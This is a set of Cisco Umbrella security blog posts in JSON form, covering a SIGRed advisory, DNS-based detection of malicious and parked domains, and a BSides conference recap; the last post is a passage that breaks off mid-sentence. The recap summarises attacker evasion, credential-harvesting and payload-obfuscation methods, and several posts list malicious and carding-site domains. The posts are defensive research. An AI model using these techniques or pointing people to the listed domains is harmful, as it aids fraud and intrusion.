{"website": "Cisco-Umbrella", "title": "Cisco Umbrella protects against SIGRed, CVE-2020-1350", "author": ["Robbie Grue"], "link": "https://umbrella.cisco.com/blog/cisco-umbrella-protects-against-sigred-cve-2020-1350", "abstract": "“Patch Tuesday” this week was more exciting than usual! On July 14, 2020, Microsoft released a security update for the issue described in CVE-2020-1350 | Windows DNS Server Remote Code Execution Vulnerability . This advisory describes a Critical Remote Code Execution (RCE) vulnerability that affects Windows DNS servers that are configured to run the DNS server role. Even if you stop reading now, we strongly recommend that server administrators apply this security update as soon as possible. Let’s get to the important facts first. What is CVE-2020-1350? AKA SIGRed (CVE-2020-1350) is a wormable, critical vulnerability (CVSS base score of 10.0) in the Windows DNS server that affects Windows Server versions 2003 to 2019. It can be triggered by a malicious DNS response. Since the service uses (SYSTEM) a.k.a. elevated privileges, if the vulnerability is exploited successfully, an attacker is granted Domain Administrator rights. This essentially gives them the keys to the kingdom to compromise a victim’s corporate infrastructure. If I’m an Umbrella customer, am I protected? Yes! Any customers of Cisco Umbrella who have configured their Microsoft DNS servers to forward to our resolvers are protected against CVE-2020-1350. If you’re not an existing Cisco Umbrella customer, perhaps this is a good time to check us out. Find out more about our recursive DNS services here . Since March 2020, the Cisco Umbrella resolvers have returned REFUSED in response to a DNS query for the SIG query type, the query type that CVE-2020-1350 is exploiting. With the announcement of CVE-2020-1350, we’ve also taken steps to decompress any SIG records that could be included in queries for other record types (for example, a query for an ANY record will return all records for that name, including a SIG record). Decompressing the record mitigates CVE-2020-1350 because the maximum size of the record is now too small to trigger the vulnerability. That said, this isn’t a substitute for applying the Microsoft patch. Cisco Umbrella can only protect queries sent to our resolvers, and we can’t guarantee that a given Microsoft DNS service isn’t configured to receive responses from other sources. What is a SIG record? Acronyms are confusing, right? Here at Cisco, we often use SIG to refer to our Cisco Umbrella secure internet gateway (SIG) package. Let’s be clear: this is not that. In this case, a SIG record refers to the “signature record” defined in early attempts at DNS security that contains the cryptographic signatures (see RFC 2931 and RFC2930 for the details). These early attempts at DNS security were largely abandoned, and SIG is now considered obsolete. Who is vulnerable? 90% of malware uses DNS in attacks. But in this case, only the Windows DNS server application is vulnerable to CVE-2020-1350. Why? It’s because this exploit makes use of specific flaws in Microsoft’s DNS server application. The Cisco Umbrella resolvers use a custom-built DNS resolver, so they are able to properly handle SIG responses. As such, the Cisco Umbrella resolvers are not themselves vulnerable to CVE-2020-1350. Back up —  I need a DNS refresher! The domain name system (DNS) is sometimes referred to as the “phone book” of the internet. You can connect to our website by typing in the IP address in the address bar of your browser, but it’s much easier to type in umbrella.cisco.com. DNS was invented for people like me! People that can’t remember long IP address numbers (like phone numbers) would prefer to look up websites by human-friendly names like umbrella.cisco.com instead. DNS servers power a website directory service to make things easier for humans. Some other stuff you should know to help make sense of this vulnerability: DNS operates over User Datagram Protocol (UDP) / Transmission Control Protocol (TCP) port 53. A single DNS (response / query) is limited to 65,535 bytes. DNS is hierarchical. If a DNS server doesn’t know the answer to a query it receives, the query is forwarded to a DNS server above it in the hierarchy. There are 13 root DNS server names worldwide. The DNS system is so important that we often refer to it as the foundation of the internet. If your recursive DNS service breaks for some reason, you won’t be able to connect to websites unless you type in the IP addresses directly. If the recursive DNS service you use is working, but has been compromised (like this exploit), then your connection to websites won’t be your only problem! Want to learn more? Read our blog that discusses DNS-layer security in detail, or learn about the differences between authoritative and recursive DNS servers . The odds for exploitation are high Is this risky? Yes! Odds are that this could be very dangerous and result in massive exposure if left unpatched. At the time of writing this blog, we have not seen this attack in the wild, but the likelihood of this vulnerability being exploited is high. Successful exploitation of this vulnerability could result in worst case scenarios ranging from data theft, breaches, loss of intellectual IP, exposure of sensitive enterprise or medical data, and more. Translation: it’s bad. The Cisco Umbrella team is actively monitoring for exploitation of this new vulnerability and will block any domains discovered. If you discover a domain attempting to abuse this technique, please let us know by contacting our Support team at https://support.umbrella.com or via email at < umbrella-support@cisco.com >. We will continue to monitor this situation closely. We strongly recommend that users should patch their affected Windows DNS Servers in order to prevent any exploitation of this vulnerability. About Cisco Umbrella Cisco Umbrella is a cloud-delivered security service that helps you secure internet access and control cloud app usage across your network, branch offices, and roaming users. Umbrella unifies DNS-layer protection, secure web gateway, firewall, and cloud access security broker (CASB) functionality, to help you secure SD-WAN and embrace direct internet access, easily. It’s the simplest cloud security service you’ll ever deploy. There is no hardware to install or software to manually update, and the browser-based interface provides quick setup and ongoing management. Get started today with a free DNS-layer trial.", "date": "2020-07-17"},
{"website": "Cisco-Umbrella", "title": "Discovery of New Malicious Domains Using Authoritative Name Server Traffic", "author": ["Dhia Mahjoub"], "link": "https://umbrella.cisco.com/blog/discovery-of-new-malicious-domains-using-authoritative-name-server-traffic", "abstract": "Authoritative DNS Overview Each day, OpenDNS handles an average of 40 billion recursive DNS queries that are efficiently directed to our 13 worldwide datacenters. Each data center hosts tens of DNS resolvers. When a resolver receives a recursive DNS query, it first checks if it has an answer in its cache, and replies with that answer. If there’s no answer in the cache, or if the answer has expired, then it issues a DNS upstream query to the authoritative name servers and passes the response back to the client. In other words, a recursive resolver performs two main operations: reply from its cache, or issue a query up the DNS authoritative name servers chain. In this blog, we discuss a new, simple-yet-effective method of mining for new malicious domains. The technique is based on the responses of authoritative name servers that are hosted on IPs tied to known suspicious or malicious domains. In authoritative DNS traffic, each DNS message has the IP of the name server that sent the reply followed by the raw DNS message. A sample authoritative DNS message is displayed below. The IP address of the name server that sent back the message is 216.239.34.10 . Since the Authoritative Answer (AA) bit is set, we know that 216.239.34.10 is one of the authoritative name servers for www.google.com. (A domain can have multiple authoritative name servers, and many do as it is preferable for redundancy). Notice that in this packet, there are no Authority or Additional sections. 1 216.239.34.10 :53 id 19910 opcode QUERY rcode NOERROR flags QR AA payload 512 ;QUESTION www.google.com. IN A ;ANSWER www.google.com. 300 IN A 74.125.24.147 www.google.com. 300 IN A 74.125.24.99 www.google.com. 300 IN A 74.125.24.105 www.google.com. 300 IN A 74.125.24.104 www.google.com. 300 IN A 74.125.24.106 The different observed types of authoritative answers we record in our logs are depicted in the diagram below. Over the past years, it has become a commodity for cybercriminals to register domains through free registrars, or registrars with lax rules with regard to registrant identification information or abuse reports. These domains are then used for all kinds of malicious purposes: phishing or scam sites, malware hosting, distribution or drop sites, or rendezvous points for botnets to receive payloads and directives. Through the domain registration process, entries for one or multiple name servers authoritative for the new domain are added to the zone of the domain higher up in the DNS hierarchy. For instance, if we register the domain, example.com, and provide ns1.example.com and ns2.example.com as name servers for example.com then new NS records for ns1.example.com and ns2.example.com are added in the .com zone. The registrant could also use name servers provided by his hosting provider if he does not want or need to deal with managing his own DNS name server. Then, at the authoritative name servers level (ns1.example.com and ns2.example.com in this example), new A records for the new domain are added (if the new domain needs only to map to IP addresses), where the domain name is made point to one or multiple IP addresses. These IPs are the hosting machines for the new domain’s content, or could be a proxy to forward traffic to another layer of domains, IPs. In the case of domains registered for malicious purposes, the hosting machines for the domain can be picked from general-purpose hosting providers or infected machines of unsuspecting users. New malicious domains discovery method One of the intuitions behind this method comes from the observation that malicious domains and their respective name servers are often hosted on the same IP or a close range of IPs that are recycled. This obviously can be used by legitimate sites, since acquiring a new IP range is not free, so the hosting usage of IPs is maximized like in the case of virtual private servers. Nevertheless, this practice is rather prevalent in the case of malicious domains and it provides a ground for this method that we explain in the following section. We parse the authoritative DNS logs and for each authoritative DNS answer, we check the IP of the nameserver that issued the response to see if it exists in our database of malicious IPs. We extract all DNS messages that were issued by nameservers whose IPs have been active recently and that have a high number of malicious domains mapping to them. Then, we mine the Answer section of each message and extract every domain, IP pair when it is an A record. This list of domain, IP pairs constitutes candidates for further investigation to decide if the domains are indeed malicious or not. We first exclude discovered domains that appear in our domains’ allow list as well as those domains that are already known to be malicious. Our goal is to discover new malicious domains, therefore, the remaning list of domains is checked with several classification heuristics like for example keeping only those domains that are part of dense clusters of malicious domains and IPs, or domains whose names have high lexical perplexity and entropy (check our blogs “How Likely is a domain to be malicious” of January 8th and “The role of country code top-level domains (ccTLDs) in malware classification” of January 18th), or domains that have been very recently registered and are parked pages. As an illustrative example, we take a sample of one hour worth of DNS authoritative logs from one resolver in our London data center. That represents about 5,316,930 DNS messages. After applying our domain discovery method, we identify several hundred new suspicious or malicious domains. A sample of newly discovered malicious domains is presented below: www[.]alexaa[.]net www[.]finansium[.]fi wormix[.]in[.]ua hancerlilerbakir[.]org qniceclubluxurysp[.]com www[.]dvmcomp[.]ru xn--habervaktm-5ub[.]afaqe2e[.]com mbkk[.]com gustavomaciel[.]com vrguyjjxorlyen[.]com zzbgzv329sbgn56[.]com empsqyowjuvvsvrwj[.]com karenburnsart[.]com viaton[.]ru www[.]costarica-luxury-vacations[.]com www[.]qluxurylinenicesp[.]com threeamigos[.]com[.]au sukcesjestblisko[.]cba[.]pl colume[.]net www[.]svonni[.]com The main goal of the Umbrella security labs is to experiment with and apply a wide variety of techniques and algorithms for discovering malicious domains by mining through our Big Data platform that consists of both recursive and authoritative DNS traffic as well as other intelligence sources. At the end, we retain those methods that are the most efficient and effective in bringing up added value in protecting our customers.", "date": "2013-01-19"},
{"website": "Cisco-Umbrella", "title": "Data Exploration : A virtual tour of the Security Graph", "author": ["Thibault Reuille"], "link": "https://umbrella.cisco.com/blog/data-exploration-virtual-tour-security-graph", "abstract": "Data visualization is essential to understanding the underlying patterns of our DNS traffic. Over the last few months, we’ve spent tremendous effort developing a 3D engine capable of rendering semantic graphs applied to our DNS problematics. But that’s not all – in order to provide a better analysis of the modern security threats, we also required an intelligent way to build appropriate datasets. Through the combination of 3D knowledge and improved use of the Ripple Effect, we are now able to deliver high resolution videos of our powerful Security Graph. Before exploring this topic further, let’s take a look at our first video: Wikileaks So, what are we looking at here? This video presents a dataset extracted from our Security Graph with a single starting point: Wikileaks.org . At first glance, you’ll notice that the graph nodes have different colors. In this case, we used a different color to represent each entity type: Blue: Domain Yellow: IP address Green: AS number The edges between the nodes represent different connection types: Domain to IP: A certain domain is mapped to a certain IP IP to ASN: A certain IP belongs to a certain ASN Domain to Domain: Related domain or Co-occurrences. Every co-occurrence connection comes with a confidence score. The speed of the co-occurrence edge particle is mapped to this confidence score – the higher the score, the faster the speed. Carding sites This dataset was extracted from the following list of domains, which are shown in a circle at the center of the graph: fullz-mart.biz gavi.cc hhfun.com hidden-crime.biz kreditkarten.ru lampeduza.net lampeduza.so octavian.su omerta.cc validmarket.ru validservice.su www.cardsmarket.su www.devil-group.com www.foreverpp.ru xcarder.net These domains were analyzed in our recent blog post, “ Examining the Target Attack and Carding Sites Using Security Graph “. For this video, we basically extracted all the co-occurrences of those domains on 4 levels. The color code here is slightly different from the WikiLeaks video; as we had several new domains to study, we wanted to know which we were already blocking/allowing. So the adjusted color code is as follows: Green: Allowed Red: Blocked Gray: Unknown (Not blocked) We only have one color for the edges (pink), as we are strictly focusing on the co-occurrence graph (the edge particles still represent the confidence score). It’s interesting to note that most of this co-occurrence neighborhood orbits in the same themes : Carding, Bitcoin trading and some anarchist content. Conclusion Hopefully you enjoyed watching these videos, which introduce a new, interactive way to look at data. Their purpose extends beyond the aesthetic, as well – these visualizations are helping our amazing research team take threat-detection to the next level by allowing them to view connections between domains more easily than ever before. This set of videos represents only our first foray into illustrating the power of the Security Graph, with more on the way. Stay tuned!", "date": "2014-02-06"},
{"website": "Cisco-Umbrella", "title": "Fast Predictive Detection of Malware domains: A New System presented at BSides Raleigh 2013", "author": ["Dhia Mahjoub"], "link": "https://umbrella.cisco.com/blog/fast-predictive-detection-malware-domains-new-system-presented-bsides-raleigh", "abstract": "Threat prediction systems are now critically important to face the ever-growing breadth and complexity of online attacks. Three weeks ago, I attended BSides Raleigh and presented a fast predictive detection system for malware domains that leverages network reputation and our passive DNS database. This new system has helped mitigate several threats over the past few months, such as Fast flux botnet domains , Cryptolocker CnCs, Exploit kit domains, and other ransomware domains. Attending the conference It was great to be a part of BSides Raleigh and spend some time in the city. All of the talks were very informative, and everyone showed a high level of knowledge and intellectual curiosity, which contributed to the success of the conference. Another memorable thing about the event was the very cool T-Shirt design: Before I describe my presentation, let me go over some of the other great talks. In the opening session, Advanced Evasion Techniques—Pwning the Next Generation Security Products , David Kennedy described elaborate techniques to evade current enterprise security products. He discussed how to: Profile a target organization “without sending a single packet to them” (using social networks, Project Sonar shared data, search engines, etc). Find out what defensive capabilities they have in place. Get an attack around their preventive measures (e.g. next generation firewalls, web application firewalls, application allowing, IDS, vulnerability assessment tools, SIEM, AV, egress filtering, etc.). Dave kept his presentation interesting with fascinating live demos of the tools he uses: Torpedo (a tool that he wrote but has not released yet) used with Burp to profile Web Application Firewalls. Recon-ng used with jigsaw.com, for organization reconnaissance and info gathering (there is a tool for enumerating information about a company’s employees also called jigsaw). The harvester : another info gathering tool (part of Backtrack ) used for instance to elicit email naming schemes of target organizations. The Social Engineer Toolkit (SET). Dave also discussed how to craft targeted emails that trigger emotional responses in their recipients in order to penetrate the organization via social engineering. He described how to clone a site to harvest username/passwords and how to obfuscate and sign the attached payloads using a throw-away certificate to abuse trust and get the victim to run the payload. In Malware Automation, Chris Elisan discussed the current state of malware, and described the tools an attacker can use to automatically build an army of armored malware. This arsenal consists of: DiY kits (ex: SpyEye, Zeus); kits that can generate an infinite number of malware samples. Armoring tools (that use time and date to generate a nearly infinite number of samples). Packers (e.g. UPX). Crypters (e.g. PFE CX, or online services such as indetectables.net). Joiners/binders. AV-scanners for quality assurance purposes (on-premise, or in the cloud). Chris demo’ed the Zeus Crimeware kit and the Saw crypter and showed how they can generate new unique malware samples en masse, and on the fly. In Bending and Twisting Networks, Paul Coggin went over various advanced strategies and techniques to attack/penetrate network infrastructures, monitor, and exfiltrate data flows. These methods exploit protocols, device features, and network trust relationships (e.g. SNMP, IP routing policies, GRE tunnels, ERSPAN, DLSw, L2TP, Lawful intercept feature, OSPF, BGP, etc). Paul also discussed several approaches to mitigate these attack vectors. My presentation When it was my turn, I discussed a predictive fast detection system of malware domains that I built leveraging network reputation and our DNS database (DNSDB). The slides of the talk are available here . This system consists of two components: An IP reputation component that carefully builds a watchlist of high risk IPs to monitor, and A detection component that performs inverse lookups against the DNSDB to instantly detect new malicious domains that resolve to the IPs in the watchlist. Both components run on a constant basis. Furthermore, in the background, the DNSDB is also constantly fed with the authoritative traffic coming from our resolvers. This traffic is first cleaned and deduplicated, then added to the indexed DNSDB. Over the past months, this system has been monitoring and detecting several threats such as: Domains serving various Exploit kits: BlackHole, Neutrino, NuclearPack, Angler, Magnitude, Styx, etc. CnC domains for trojans such as Sality, Caphaw. CnC domains for ransomware such as CryptoLocker, Reveton, Urausy. Domains serving browser-based ransomware (browlock). Early detection of initial Cryptolocker CnC domains Cryptolocker, the now infamous ransomware, emerged in early September of this year. The very first two CnCs spotted in the wild (xeogrhxquuubt,com and qaaepodedahnslq,org) were picked up by our detection system as soon as they hit our traffic and a few hours before they were published in the security community. We think that this ensured the initial low infection rate for Umbrella users. We further used other models to track down Cryptolocker DGA CnCs and mitigate the threat for our customers. Predicting the emergence of Exploit kit and malware domains The detection system also regularly helps predict patterns of how malicious domains use the network infrastructure. One example was NuclearPack domains that were initially spotted on 142.4.194.0 on Oct 28th [ details here ]. We predicted that the Exploit kit domains would soon shift to the next IPs, and that was confirmed the next day [ details here ]. We also used the system to spot a malware campaign in its early stage: we discovered on Nov 1st that an initial range of 55 IPs in the range 62.122.73.200-254 were all loaded with rogue software payloads, and only 8 IPs were hosting live domains at the moment of discovery. We predicted that new domains would emerge on the remaining IPs [ details here ]. This has been confirmed, and currently there are 22 IPs hosting domains and serving the malware payloads. The campaign is still ongoing—we predict the full range of 55 IPs to be used for domain hosting and malware serving. Conclusion Security is a complex endeavor, and the various talks at BSides Raleigh showed once more that different layers and strategies must be deployed to protect valuable assets of the individual and enterprise alike. The human element is also important, as a lot of current attacks combine social engineering with technical exploitation. This new predictive detection system for malware domains is an early detection layer in a defense-in-depth approach to security. It’s now a key part of the arsenal of models we use to detect malicious domains at the earliest stage so we can protect our customers from the avalanche of online threats.", "date": "2013-11-07"},
{"website": "Cisco-Umbrella", "title": "Finally, a real solution to DNS rebinding attacks", "author": ["David Ulevitch, Founder/CEO"], "link": "https://umbrella.cisco.com/blog/finally-a-real-solution-to-dns-rebinding-attacks", "abstract": "We just launched a subtle new feature for all OpenDNS account holders (it’s free) that helps protect against a class of DNS vulnerabilities known as DNS Rebinding attacks. In short, these attacks take advantage of design flaws or weaknesses in how some Internet applications (notably web browsers) cache DNS data so that internal network resources can be accessed by external servers regardless of firewall settings. This can happen because the browser (or similarly exploitable vector) acts as a conduit between the private internal resource and the external server. In plain English this means that some bad guy on the Internet can access your home access point, wireless access point, internal file server or any other networked device on your network just by getting you to load some javascript on a webpage. While this might seem like a browser issue, it’s fundamentally a DNS issue. This is why OpenDNS created what will become a new class of filtering tools called Suspicious Response Filters . These new filters are different from the filtering options we’ve offered to date in one important way. Rather than filtering based on the DNS question being asked (eg, “Where is foo.com?”) these filters inspect the DNS reply before we send it back to you (eg, “Does this reply point to an internal resource?”). Like most of our features, this is an industry first. No other major DNS software or service offers anything like this. When I started OpenDNS I often told people one of my main goals was to design a global DNS service that empowered people to let the good DNS in and keep the bad DNS out , for whatever definition of good and bad they had. This feature gets us one step closer to delivering on that promise. The feature is turned off by default, but I encourage everyone to go into your account and turn it on. Those of you with domains that point to private address space legitimately (to your intranet, for example) should also visit the domain allow list page and allow your domain. Naturally, any domain in your allow list will not have its responses filtered in any way and will be explicitly allowed.", "date": "2008-04-14"},
{"website": "Cisco-Umbrella", "title": "Five Questions: Your Top Support Requests…Answered!", "author": ["Alexander Harrison"], "link": "https://umbrella.cisco.com/blog/five-questions-top-support-requests-answered", "abstract": "Hi, I’m Alexander Harrison, a customer support representative here at OpenDNS. My job is to ensure that all of your questions and challenges are met with the answers needed to get OpenDNS working for you. In this blog post, I’ve compiled the top five questions that come in to our team, as well as the necessary steps to resolve these issues as quickly as possible. 5: Filtering was set to High/Medium, and now Facebook and other HTTPS sites are making many errors. Does OpenDNS work with HTTPS sites? The reason you’re seeing certificate errors is because the webpage you intended to visit is being blocked by the current filtering settings. When a web page is blocked, you’ll see the OpenDNS Block Page instead of the website you intended to visit, and in most modern web browsers this will produce a security prompt for a *.opendns.com certificate error. The error will look similar to one of the images below: This notification indicates that the SSL certificate for the secure site has been loaded, and that the OpenDNS block page doesn’t match your intended page. This is expected when blocking HTTPS web pages. Many of these errors can be bypassed or ignored in order to see the standard OpenDNS block page by using our Certificate Error Mitigation Instructions . 4: OpenDNS is set up, but it is only working on one or some of the computers on the network. There are many ways to successfully configure OpenDNS. Sometimes when the network is configured, old DNS settings need to be cleared from some of the computers on the network. We’ve set up a guide to assist with this process. The guide addresses what to do when just one computer is filtering as a result of manually configuring the computer but skipping the configuration of the router. We also explain what to do when just one computer or device isn’t working due to otherwise configured DNS settings on the computer that need to be removed before filtering will work on it. Some programs like Comcast ConstantGuard automatically override OpenDNS settings—and either need to be configured not to do this, or will need to be removed. Instructions for how to do this are provided in the aforementioned guide. 3: I want to block most social networking, but allow Facebook (keeping everything else blocked). Great news: OpenDNS has such a feature! Since the social networking category needs to remain blocked in order to block other social networking sites, you will need to create an exception to allow Facebook alone. To do this, you will need to add the domain “facebook.com” to your account’s allow list. Note that you are adding “facebook.com” rather than “www.facebook.com.” It is important to add this domain without the “www.” to see it unblocked correctly. For more detailed steps, see our guide for adding domains to the allow/block list for the OpenDNS Dashboard. What about allowing YouTube while still blocking video sharing? This can be done in the same way by adding “youtube.com” to the allow list. The same goes for your favorite sports site like ESPN (add espn.com, espn.go.com to the allow list), and so on. 2: I set up OpenDNS and it was working great, but one day it suddenly stopped working. Why? Since most Internet providers give users a dynamic IP address , chances are that the public IP address for your network has changed. Have no fear, OpenDNS has a program – the Dynamic IP Updater Client – specifically for  updating your IP address when it changes. (Note that the Updater works best when installed on a computer that stays at home.) Updates can also be made manually by clicking the green circular icon by the network which needs to be updated. To confirm that the IP is up to date, match the IP address listed at the top of your Dashboard with the one registered to your network. If they match, your filters will apply. If not, you will need to update them before changes will apply. If your network says “Inactive,” please contact OpenDNS Support. If the filters have been off for more than a few days, you’ll also need to flush your DNS cache to ensure that the filters fully apply right away. Please see Clearing the DNS Cache on Computers and Servers for more information. 1: And now, the top reason for opening a ticket as tallied by our support team:  “I registered my network and set up filters, and even installed the OpenDNS Updater client… but it isn’t working.” Since OpenDNS is a DNS-based filtering solution, you won’t be able to install it like a program. The fastest way to test to see if OpenDNS’s DNS servers have been configured on your computer is to visit http://welcome.opendns.com and look for a big orange check mark for success. If you see an “X,” OpenDNS still needs to be configured before the filters and statistics will work. Our set-up guide can be found here .  We recommend configuring OpenDNS on your router so that each device on your network is covered by changing this one setting; however, individual configuration is possible by choosing to configure a computer from these options . If you see a check mark but filtering has not been enabled, chances are the answer to your question can be found at our troubleshooting settings page . This page also provides the necessary steps to resolve the case in which some, but not all, computers are filtering. What about statistics? After filtering is enabled, stats will still take a few hours to first appear, and should start appearing by the following day at the latest. If no stats appear after one day, the best way to resolve this is to contact OpenDNS support with your results from our diagnostic test tool. These are the top five support questions we receive on a daily basis. After reviewing our top 5 most popular support requests, you are now an honorary support agent and can resolve the questions most frequently asked of OpenDNS support—congrats! (Don’t be a stranger though—if you’re having trouble, we’re always here to help!)", "date": "2014-12-12"},
{"website": "Cisco-Umbrella", "title": "A look at the relationship between parked domains and malware", "author": ["Dhia Mahjoub"], "link": "https://umbrella.cisco.com/blog/discovery-of-new-suspicious-domains-using-authoritative-dns-traffic-and-parked-domains-analysis", "abstract": "Introduction For a quick interview podcast on this blog with Dhia go here. The Umbrella Security Labs research team uses several algorithms and techniques to discover new malicious domains, including our proprietary technology the Umbrella Security Graph. We are constantly looking at data in new ways, both in performing experiments that could help us uncover malicious, or potentially malicious domains, and in attempting to develop new algorithms and data mining methods. After a recent experiment that uses a method for discovering new, potentially malicious domains by examining authoritative DNS traffic, we were curious to see what other deductions could be made from examining the traffic. Further exploring this data mining technique resulted in identifying a new method for zeroing in on parked domains that could potentially host suspicious ad networks which might serve malware. (The full details on this data mining technique are shared at the end of this post.) Ultimately, our experiment will result in improved security for Umbrella customers, as we are now able to uncover new threats linked to parked domains in a methodical way. Parked domains: troublesome or malicious? Parked domains aren’t usually in the spotlight as infection vectors, but it might be time they get some attention. Parked domains are single-page portals laden with ads, devoid of any value to the occasional visitor. They are usually set up by typosquatters or legitimate domain registrars that seek to monetize the visits of users who might land on the main page. Despite technically being a legitimate business, parked domain monetization can get mixed up with suspicious practices and malicious content. The ads parked domain operators serve are provided by Internet advertising publishers. In some cases, these ad publishers can be lax about scanning the ads for any malicious content. Or, the page might get unknowingly compromised and end up serving malvertisements. Even recently, landing pages of parked domains have served malware on a large scale. Commtouch’s 2012 Internet Threats report points out that parked domains are among the top categories of websites to serve malware, and that “the hosting of malware may well be the intention of the owners of the parked domains”. Although parked domains represent the long tail of malware infection vectors, and Threatpost’s article recommends that security professionals should focus on high-profile threats rather than wasting resources investigating them, we think that parked domains could represent a first, stealth phase in a malicious domain’s lifetime. We propose that attackers could register the domains, park them with bogus ads, and use them to generate some revenue with the occasional visitor or victim. In a subsequent phase, the domains could potentially be converted, or “traded” to be used as malware distribution sites, drop sites, or C&C. They are also often associated with gambling, porn, fake drugs, scams, etc. A lot of these parked domains are also registered under bogus registrant credentials, indicating addresses in some exotic countries like British Virgin Islands, Saint Vincent and the Grenadines or the Bahamas. It’s our opinion that the low reputation and lack of usefulness of parked domains is enough to categorize them as suspicious/malicious. A new technique for detecting parked domains Since we’re hypothesizing that parked domains be treated as malicious, our next step is to identify them in bulk and evaluate their content. So, how can we do it? Domain parking services such as DomainSponsor, Sedo, Network Solutions, Yahoo, Oversee.net, GoDaddy, etc. use different page templates and site structures, so a technique that attempts to programmatically detect all of them might not work all the time. It turns out, however, that a lot of parked domains respond successfully to an HTTP request that seeks a wildcard subdomain or a non-existent page. A quick method would then be to check for wildcard subdomains. At the DNS level, for a given domain D, we check if a wildcard subdomain under D resolves. If it does, we know D is a parked domain, if it does not then D is very likely not a parked domain. At the HTTP level, a large number of parked domains respond to wildcard subdomains either with a dynamically-generated page full of ads or a redirect to the domain’s front page. For example, let’s check if the domain 123-service[.]ru is parked or not. We issue an HTTP request to a URL formed by prepending a random string to the domain name to form a wildcard subdomain. For example, we form the following URL: hxxp://nj71bwm4zo56rbgjy4d29ols[.]123-service[.]ru and then send the HTTP request with that URL. The site indeed responds with a valid page full of bogus ads. In these cases, parked domains will either respond with the same advertisement page, a randomly-changing page under the same domain, or redirect you to another parked domain. Notice that when we issue HTTP requests seeking wildcard subdomains or non-existent pages, normal domains typically respond with a standard 404 Not Found, whereas, parked domains will respond with a 200 OK response or a 3xx redirection code followed by a 200 OK successful response when the user lands on the final page. In my experiments, I used Python and httplib2 . Some parked domains respond to the HTTP requests sent by the script with empty pages. So, I changed the user agent in the HTTP request to an old version of IE, and set the referrer to google search, just so it seemed to the website that I am running an old browser and coming from a search engine. This is reminiscent of search engine poisoning as a lot of malicious typosquatters and parked domain operators use SEO techniques so that their sites appear at the top of the page of the search results for the terms or topics they are targeting. The site will respond differently depending on the User Agent or Referrer and might lead the user to a malicious domain, if the user’s machine is detected to be vulnerable. Notice that Google detects parked domains and usually removes them from their search result pages. A useful tool I used to debug the flowing HTTP traffic is Justniffer. Below you can see an excerpt of the Python code I used: h = httplib2.Http(“.cache_httplib”)\nh.follow_all_redirects = True\ntry:\n  random_subdomain = “”.join( [random.choice(string.letters) for i in xrange(15)] )\n  if(domain[:7]!=”http://”):\n    link = “http://” +random_subdomain + “.”+ domain+”/”\n  resp, content = h.request(link, “GET”, headers={‘User-Agent’:'Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; Win 9x  4.90)’,'Content-Type’:'text/plain’, ‘Referer’: ‘http://www.google.com/search?hl=fr&q=dictionary+french’})\n  contentLocation = resp['content-location']\n  if(contentLocation!=”\"):\n    print domain\nexcept:\n  return Now, as an example, let’s take the daily candidate domain list produced by a first filtering heuristic: the IP-NS_IP-match heuristic (details on that below). That list consists of 539,904 domains, 2,355 of which are known to be malicious. The remaining 537,549 are not known to be malicious, but 36,367 domains have IPs that are active and are tied to active malicious domains. These 36,367 domains are candidates to be further filtered by the domain-IP reputation heuristic. As we’ll explain in detail below about the domain-IP reputation heuristic, for a candidate domain D, if it maps to an IP that is active and malicious, we can vary N, the size of the neighborhood of the IP, where the neighborhood represents the active malicious domains tied to this IP. The higher the N, the more likely the candidate domain D is associated with a suspicious/malicious domain-IP neighborhood. We observed that large sets of parked domains tend to be hosted on a small set of hosting IP “hubs”, where these domains can serve sometimes similar, sometimes varying bogus ad campaigns. For example, we observed parked domains hosted on the same IP hubs that serve pharmacy and health-themed ads or gaming ads. In the graphs below, we show the number of discovered suspicious/malicious domains as the threshold N grows, and the percentage of parked domains in the discovered domains set as N grows. Notice that, in the initial candidate set of 36,000+ domains, there are close to 30% parked domains. We can see that the percentage of parked domains dramatically increases as N grows. Therefore, one of the features of the domain-IP reputation technique is that as we increase N, it becomes more and more efficient at isolating parked domains. Then the wildcard subdomain technique is useful at validating the former technique. We then can either discard parked domains as noise and focus on other categories of suspicious domains, or we can consider parked domains themselves for further study. Malicious links on parked domains To further analyze parked domains, we systematically extract all URLs embedded in the source code of the landing page. In this section, I describe a few examples of the parked domains that we discovered were linking to malicious domains. bjb[.]doctordams[.]ru, a parked domain is reported on WOT as a scam site, and a Russian pill spammer. It links to pharmacy-checker1[.]com which is a blocked domain associated with pharmacy fraud, fake drugs, scams, and malware. The IP that bjb[.]doctordams[.]ru resolves to, also hosts another 1776 parked domains (all 3LDs) from the discovered set, where practically all of them are pharmacy fraud sites prone to distributing malware. These 3LDs belong to 44 different second level domains, with 41 of them registered on March 6th, 2013 under the .ru ccTLD. doctordams[.]ru is one of them along with others like doctorkook[.]ru, doctordote[.]ru, doctorpeck[.]ru, doctorputz[.]ru, doctorarid[.]ru, doctorecru[.]ru, doctorlire[.]ru, doctormuck[.]ru, etc. The same hosting IP has hosted close to 1,000 malicious domains in the past 8 months. Clearly, these domains and IP are up to no good. boskcom[.]com (not yet reported as malicious) links to yieldmanager[.]com, reported on WOT as an intrusive ad company which downloads tracking cookies and malware on user’s machines. boskcom[.]com resolves to an IP that has hosted more than 100 known malicious domains. viirgilio[.]it links to fwdservice[.]com, a blocked domain associated with phishing and distributing malware. viirgilio[.]it resolves to an IP that hosts 700+ parked domains from the discovered set. The IP has hosted more than 1,000 known malicious domains. There are examples of suspicious domains that many parked domains point to: rmgserving[.]com, which appeared in network traces of some known trojans that were seeking urls in subdomains of rmgserving[.]com; ib[.]adnxs[.]com is a known advertisement site. It also reportedly serves annoying pop-ups and ads that might be malicious. searchtermresults[.]com is another site pointed to by a lot of parked domains. It was registered Feb. 18, 2013, and its intent is rather suspicious. ———- More about our methods Filtering Heuristic 1: IP matching Given raw, authoritative DNS logs, we apply an initial filtering heuristic (that we refer to as IP-NS_IP-match) to retain only domain names whose IP (or one of the IPs, in case the domain resolves to several) matches the IP of the responding authoritative name server. This is allowed by the standard. It does limit the domain’s resilience to failure though, but still occurs in practice. For example, taking a daily sample of authoritative logs from three different resolvers (in London, Ashburn and Singapore), we count 6.1 million (6,111,576) unique domains, Out of these, 539,904 domains (about 8.8 %) have IPs that match the IP of the name server that provided the response. I was curious to further examine domains that meet this criteria. Filtering Heuristic 2: Domain-IP reputation technique In the next step, we apply a filtering technique based on domain/IP reputation. If a domain D is not already in the blocked list and is not allowed, then we examine its IP reputation. If one of the IPs that domain D maps to is malicious and active (i.e. the IP belongs to the block list of the current day), and there are N active malicious domains (i.e. that belong to the current day’s block list) that map to this IP, then we consider domain D as malicious with high likelihood. In other words, if we build a domain-IP graph, where nodes represent domains and IPs, and an edge links a domain to an IP if the 